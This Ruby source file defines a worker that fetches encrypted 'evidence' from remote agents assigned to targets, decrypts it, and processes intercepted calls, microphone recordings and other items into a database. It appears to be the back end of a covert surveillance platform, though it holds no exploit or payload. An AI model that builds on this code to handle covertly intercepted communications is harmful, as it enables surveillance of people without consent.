require 'mongo'
require 'openssl'
require 'digest/sha1'
require 'digest/md5'
require 'thread'

require 'rcs-common/trace'
require 'rcs-common/evidence'
require 'rcs-common/path_utils'

require_release 'rcs-db/config'
require_release 'rcs-db/db_layer'
require_release 'rcs-db/grid'
require_release 'rcs-db/alert'
require_release 'rcs-db/connector_manager'

require_relative 'call_processor'
require_relative 'mic_processor'
require_relative 'single_processor'
require_relative 'db'
require_relative 'statistics'

require_relative 'evidence/single_evidence'
require_relative 'evidence/audio_evidence'
Dir[File.expand_path('../evidence/*.rb', __FILE__)].each { |path| require(path) }


module RCS
  module Worker
    class MissingAgentError < Exception; end

    class InstanceWorker
      include RCS::Tracer

      MAX_IDLE_TIME = 300 # 5 minutes
      READ_INTERVAL = 3
      READ_LIMIT = 100
      DECODING_FAILED_FOLDER = 'decoding_failed'

      def initialize(instance, ident)
        @instance = instance
        @ident = ident
        @agent_uid = "#{ident}:#{instance}"
      end

      def run
        raise MissingAgentError.new("Unable to run instance worker #{@agent_uid}, agent is missing") unless agent?

        trace(:info, "[#{@agent_uid}] Evidence processing started for agent #{agent.name}")

        idle_time = 0

        loop do
          list = fetch

          if list.empty?
            idle_time += READ_INTERVAL
            break if idle_time >= MAX_IDLE_TIME
          else
            idle_time = 0
            list.each { |ev| process(ev) }
          end

          sleep(READ_INTERVAL)
        end

        trace(:info, "[#{@agent_uid}] Evidence processing terminated for agent: #{agent.name} (#{idle_time} sec idle)")
      rescue MissingAgentError => ex
        trace(:error, ex.message)
        delete_all_evidence
      end

      def fetch
        @collection ||= db.collection('grid.evidence.files')
        @collection.find({filename: @agent_uid}, {sort: ["_id", :asc]}).limit(READ_LIMIT).to_a
      end

      def db
        RCS::Worker::DB.instance.mongo_connection
      end

      def agent?
        @agent, @target = nil, nil
        !!target
      end

      def agent
        @agent ||= Item.agents.where({ident: @ident, instance: @instance, status: 'open'}).first
      end

      def target
        @target ||= agent.get_parent if agent
      end

      def delete_all_evidence
        trace(:error, "[#{@agent_uid}] Agent or target is missing, deleting all related evidence")
        RCS::Worker::GridFS.delete_by_filename(@agent_uid, "evidence")
        true
      end

      # The log key is passed as a string taken from the db
      # we need to calculate the MD5 and use it in binary form
      def decrypt_key
        @decrypt_key ||= Digest::MD5.digest(agent['logkey'])
      end

      def process(grid_ev)
        start_time = Time.now
        raw_id = grid_ev['_id']

        raise MissingAgentError.new("Unable to process evidence #{raw_id}, agent #{@agent_uid} is missing") unless agent?

        list, decoded_data = decrypt_evidence(raw_id)

        return if list.blank?

        ev_type = nil
        ev_processed_count = 0

        list.each do |ev|
          next if ev.empty?

          ev_processed_count += 1
          ev_type ||= ev[:type]

          trace(:debug, "[#{@agent_uid}] Processing #{ev[:type].upcase} evidence for agent: #{agent.name}")

          # store agent instance in evidence (used when storing into db)
          ev[:instance] ||= @instance
          ev[:ident] ||= @ident

          # find correct processing module and extend evidence
          processing_module = "#{ev[:type].to_s.capitalize}Processing".to_sym
          processing_module = RCS.const_defined?(processing_module) ? RCS.const_get(processing_module) : DefaultProcessing
          ev.__send__(:extend, processing_module)

          # post processing
          ev.process if ev.respond_to?(:process)

          # full text indexing
          ev.respond_to?(:keyword_index) ? ev.keyword_index : ev.default_keyword_index

          processor = processor_class(ev[:type])

          # override original type
          ev[:type] = ev.type if ev.respond_to?(:type)

          evidence_id, index = processor.feed(ev, agent, target) do |evidence|
            save_evidence(evidence) if evidence
          end
        end

        trace(:info, "[#{@agent_uid}] Processed #{ev_processed_count} #{ev_type.upcase} evidence for agent #{agent.name} (#{decoded_data.size} bytes in #{Time.now - start_time} sec") if ev_processed_count > 0
      rescue Mongo::ConnectionFailure => e
        trace :error, "[#{@agent_uid}] cannot connect to database, retrying in 5 seconds..."
        sleep(5)
        retry
      rescue MissingAgentError => ex
        raise(ex)
      rescue Exception => e
        trace :fatal, "[#{@agent_uid}] Unrecoverable error processing evidence #{raw_id}: #{e.class} #{e.message}"
        trace :fatal, "[#{@agent_uid}] EXCEPTION: " + e.backtrace.join("\n")

        decode_failed(raw_id, decoded_data) if decoded_data
      ensure
        delete_evidence(raw_id) if raw_id
      end

      def processor_class(evidence_type)
        case evidence_type
          when 'call'
            @call_processor ||= CallProcessor.new
          when 'mic'
            @mic_processor ||= MicProcessor.new
          else
            @single_processor ||= SingleProcessor.new
        end
      end

      def decode_failed(raw_id, decoded_data)
        Dir.mkdir(DECODING_FAILED_FOLDER) unless File.exists?(DECODING_FAILED_FOLDER)
        path = "#{DECODING_FAILED_FOLDER}/#{raw_id}.dec"
        File.open(path, 'wb') { |file| file.write(decoded_data) }
        trace :debug, "[#{@agent_uid}] Undecoded evidence #{raw_id} stored to #{path}"
      end

      def decrypt_evidence(raw_id)
        content = RCS::Worker::GridFS.get(raw_id, "evidence") rescue nil
        return unless content

        decoded_data = ''

        evidences, action = RCS::Evidence.new(decrypt_key).deserialize(content.read) do |data|
          decoded_data += data unless data.nil?
        end

        return [evidences, decoded_data]
      rescue EmptyEvidenceError => e
        trace :debug, "[#{@agent_uid}] deleting empty evidence #{raw_id}"
        return nil
      rescue EvidenceDeserializeError => e
        trace :warn, "[#{@agent_uid}] decoding failed for #{raw_id}: #{e.to_s}"
        decode_failed(raw_id, decoded_data) if decoded_data
        return nil
      end

      def delete_evidence(raw_id)
        RCS::Worker::GridFS.delete(raw_id, "evidence")
        trace(:debug, "[#{@agent_uid}] deleted raw evidence #{raw_id}")
      rescue Exception => ex
        trace(:error, "[#{@agent_uid}] Unable to delete raw evidence #{raw_id} (maybe is missing): #{ex.message}")
      end

      def save_evidence(evidence)
        # update the evidence statistics
        size = evidence.data.inspect.size
        size += evidence.data[:_grid_size] unless evidence.data[:_grid_size].nil?
        RCS::Worker::StatsManager.instance.add(processed_evidence: 1, processed_evidence_size: size)

        # enqueue in the ALL the queues
        evidence.enqueue
      end

      def to_s
        "Instance worker #{@agent_uid}"
      end
    end
  end
end
